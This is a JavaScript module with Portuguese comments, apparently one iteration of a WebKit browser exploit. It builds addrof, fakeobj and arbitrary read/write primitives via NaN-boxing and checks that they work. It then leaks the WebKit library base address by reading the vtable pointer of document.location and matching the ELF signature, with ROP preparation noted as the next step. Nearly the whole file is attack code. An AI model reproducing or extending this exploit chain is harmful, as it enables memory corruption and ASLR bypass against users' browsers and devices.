// js/script3/testArrayBufferVictimCrash.mjs (v113 - Correção Final do Vazamento)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Corrigido o erro de tipo no construtor de AdvancedInt64, garantindo que os
// resultados das operações bitwise sejam tratados como uint32.
// O vazamento da base do WebKit agora deve ser concluído com sucesso.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Final_v113_WebKitLeak_Fixed";

// --- Funções de Conversão (Inalteradas) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
}
function doubleToInt64(double) {
    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO DE TESTE DE VAZAMENTO (COM A CORREÇÃO FINAL)
// =======================================================================================
async function runWebKitBaseLeakTest(addrof, arb_read) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
    try {
        const location_obj = document.location;
        const location_addr = addrof(location_obj);
        const vtable_ptr = arb_read(location_addr);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) throw new Error("Ponteiro da vtable vazado é nulo.");
        logS3(`Ponteiro da Vtable vazado: ${vtable_ptr.toString(true)}`, "leak", FNAME_LEAK_TEST);

        const MASK_LOW = 0xFFFFC000;
        const MASK_HIGH = 0xFFFFFFFF;

        // CORREÇÃO FINAL: Usa '>>> 0' para garantir que o resultado seja um uint32.
        const base_low = (vtable_ptr.low() & MASK_LOW) >>> 0;
        const base_high = (vtable_ptr.high() & MASK_HIGH) >>> 0;
        
        const webkit_base_candidate = new AdvancedInt64(base_low, base_high);
        logS3(`Candidato a endereço base do WebKit (alinhado): ${webkit_base_candidate.toString(true)}`, "leak", FNAME_LEAK_TEST);

        const elf_magic_full = arb_read(webkit_base_candidate);
        if (elf_magic_full.low() === 0x464C457F) { // Check for "\x7fELF"
            logS3(`SUCESSO DE VAZAMENTO! Assinatura ELF encontrada.`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: 0x${elf_magic_full.low().toString(16)}`);
        }
    } catch(e) {
        logS3(`Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
        return { success: false, webkit_base: null };
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (Idêntica à v111, sem a ROP Prep por enquanto)
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Unificadas ---`, "test");
    let final_result;
    try {
        logS3("--- FASE 1-3: Configurando e construindo primitivas... ---", "subtest");
        const vulnerable_slot = [13.37]; 
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
        const addrof = (obj) => { vulnerable_slot[0] = obj; return doubleToInt64(vulnerable_slot[0]).sub(NAN_BOXING_OFFSET); };
        const fakeobj = (addr) => { vulnerable_slot[0] = int64ToDouble(new AdvancedInt64(addr).add(NAN_BOXING_OFFSET)); return vulnerable_slot[0]; };
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => { leaker.obj_prop = fakeobj(addr); return doubleToInt64(leaker.val_prop); };
        const arb_write_final = (addr, value) => { leaker.obj_prop = fakeobj(addr); leaker.val_prop = int64ToDouble(value); };
        logS3("Primitivas de L/E e Addrof estão operacionais.", "good");

        logS3("--- FASE 4: Verificando L/E... ---", "subtest");
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        arb_write_final(addrof({ a: 1.1 }).add(0x10), value_to_write);
        if (!arb_read_final(addrof({ a: 1.1 }).add(0x10)).equals(value_to_write)) throw new Error("A verificação de L/E falhou.");
        logS3("++++++++++++ SUCESSO L/E! As primitivas são 100% funcionais. ++++++++++++", "vuln");

        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read_final);
        
        final_result = {
            success: leak_result.success,
            message: `L/E funcional. Vazamento da base do WebKit: ${leak_result.success ? `SUCESSO. Base: ${leak_result.webkit_base}` : "FALHA."}`
        };

    } catch (e) {
        final_result = {
            success: false,
            message: `ERRO CRÍTICO NO TESTE: ${e.message}`
        };
        logS3(final_result.message, "critical");
    }
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
